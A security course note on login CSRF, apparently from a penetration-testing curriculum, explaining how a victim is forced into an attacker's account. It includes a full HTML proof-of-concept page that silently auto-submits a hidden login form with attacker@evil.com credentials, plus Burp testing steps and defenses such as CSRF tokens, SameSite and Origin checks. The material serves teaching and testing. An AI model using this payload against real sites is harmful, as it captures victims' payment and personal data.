---
tags: [vapt, authentication, csrf, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.16 Login CSRF"
---

# 16.16 — Login CSRF

## What Is Login CSRF?

```
REGULAR CSRF: Force a logged-in user to perform an action they didn't intend
              (change email, transfer money, etc.)

LOGIN CSRF: Force an UNAUTHENTICATED user to log in AS THE ATTACKER!

FLOW:
  1. Attacker creates a "force login" form:
     <form action="https://target.com/login" method="POST">
       <input name="username" value="attacker@evil.com">
       <input name="password" value="attackerpassword">
     </form>
     
  2. Victim visits attacker's page → form auto-submits
  3. Victim is now logged in as the ATTACKER's account!
  4. Victim interacts with the site (enters sensitive info, saves payment cards)
  5. Attacker logs into their account → sees victim's data!
  
IMPACT:
  - Victim enters credit card → saved to attacker's account!
  - Victim fills personal details → attacker gets them
  - Victim browses privately → attacker sees their history
```

---

## Attack Example

```html
<!-- ATTACKER'S PAGE: -->
<!DOCTYPE html>
<html>
<head><title>Cute Cats</title></head>
<body onload="document.forms[0].submit()">
  <!-- Form silently logs victim into attacker's account: -->
  <form action="https://target.com/login" method="POST" style="display:none">
    <input name="email" value="attacker@evil.com">
    <input name="password" value="Attacker123!">
  </form>
  <h1>Loading cute cats...</h1>
</body>
</html>

<!-- 
  Victim visits attacker's site
  → Silently submits the form
  → Victim's browser now has session for attacker's account on target.com
  → Victim thinks they're logged out or not logged in
  → Victim logs in manually (or just uses the site thinking it's fine)
  → Actions performed as attacker!
-->
```

---

## Testing for Login CSRF

```
STEP 1: Check if login form has CSRF protection:
  Inspect the login form HTML:
  <form action="/login" method="POST">
    <input name="username" ...>
    <input name="password" ...>
    <input name="csrf_token" value="XXXXXXXX"> ← Look for this!
  </form>
  
  No csrf_token? → Potentially vulnerable!

STEP 2: Attempt login without CSRF token:
  Intercept login request in Burp
  Remove csrf_token parameter (or send without it)
  → If login succeeds → CSRF protection missing on login!

STEP 3: Cross-origin form submission test:
  Create a page on another domain
  Post to the login endpoint
  → If victim gets logged in → login CSRF confirmed!

NOTE:
  SameSite=Lax cookies PARTIALLY protect:
  Browser won't send cookies on cross-site POST
  BUT: if site uses cookie-less sessions or login doesn't require cookies → still works!
  AND: if login response sets a cookie (it does) → the session is set regardless
```

---

## Additional Login CSRF Scenarios

```
1. OAUTH LOGIN CSRF:
   See note 16.20 for OAuth-specific login CSRF
   (Force victim to authenticate with attacker's OAuth identity)
   
2. ACCOUNT LINKING CSRF:
   If app allows linking external accounts (Google, GitHub)
   → CSRF the account-linking endpoint
   → Victim's account gets linked to attacker's Google account
   → Attacker can log in as victim via Google OAuth!
   
3. POST-LOGIN ACTIONS:
   Not strictly "login CSRF" but:
   After victim is logged in (to attacker's account) and enters data:
   - Payment details saved
   - Address saved
   - Documents uploaded
   → All go to attacker's account profile!
```

---

## Fix

```
DEFENSES:
  ✓ CSRF token on the login form (same as any other form)
  
  ✓ SameSite=Strict on session cookies:
    Prevents the session cookie from being sent in cross-site requests
    BUT: Login doesn't use existing cookies (sets new ones)
    → SameSite on new session cookie alone doesn't prevent CSRF login
    → Still need CSRF token!
    
  ✓ For OAuth: use state parameter (anti-CSRF)
    See note 16.20
    
  ✓ Origin/Referer header validation on login endpoint
```

---

## Related Notes
- [[Module 11 - CSRF]] — CSRF fundamentals
- [[20 - OAuth Login CSRF]] — OAuth-specific CSRF bypass
- [[16.11 - 16.15 MFA bypass]] — what happens after login bypass
